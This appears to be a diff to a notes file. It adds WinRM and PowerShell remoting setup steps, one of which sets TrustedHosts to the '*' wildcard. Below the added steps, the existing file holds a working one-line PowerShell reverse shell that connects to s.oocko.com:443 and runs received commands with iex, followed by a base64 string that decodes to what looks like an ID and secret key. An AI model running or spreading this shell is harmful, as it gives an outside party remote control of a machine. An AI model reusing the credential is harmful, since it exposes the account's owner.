@@ -1,3 +1,48 @@
+--- ] enable winrm
+On remote server:
+1. Make sure the Windows Remote Management (winrm) service is running
+# Get the status of the winrm service
+Get-Service winrm
+# If it not running, start the service
+Start-Service winrm
+# Also set the service to start automatically (Delayed Start)
+Set-Service "winrm" -StartupType Automatic
+# Enable winrm 
+winrm quickconfig
+
+2. Make sure your network connection type is private
+# To see if it's set to private or not run this
+Get-NetConnectionProfile
+# To set it to Private, run this (as admin)
+Set-NetConnectionProfile -NetworkCategory Private
+
+3. Enable PowerShell remoting
+Enable-PSRemoting -Force
+
+
+On local computer:
+1. Make sure the Windows Remote Management (winrm) service is running
+# Get the status of the winrm service
+Get-Service winrm
+# If it not running, start the service
+Start-Service winrm
+# Also set the service to start automatically (Delayed Start)
+Set-Service "winrm" -StartupType Automatic
+
+2. Add the ‘remote server’ to the trusted host list
+# Add your 'remote server's' IP to the trusted host list
+Set-Item WSMan:\localhost\Client\TrustedHosts -Value "192.168.1.1" -Force
+# Or if IPs are constantly changing, add ALL IPs (* is the wildcard)
+Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Force
+# Check and make sure the right value is in the trusted host list
+Get-Item WSMan:\localhost\Client\TrustedHosts
+# To clear the trusted host list, run this
+Set-Item WSMan:\localhost\Client\TrustedHosts -Value "" -Force
+ 
+#Configure WinRM access for Non-Administrator users
+Set-PSSessionConfiguration Microsoft.PowerShell -ShowSecurityDescriptorUI
+
+
 $client = New-Object System.Net.Sockets.TCPClient("s.oocko.com",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 
 TGczMmFJSUJEaUhPQVZzUzV4SjE6VWhrOHZLbFRSYkNSclZ1dll0QWJxQQ==
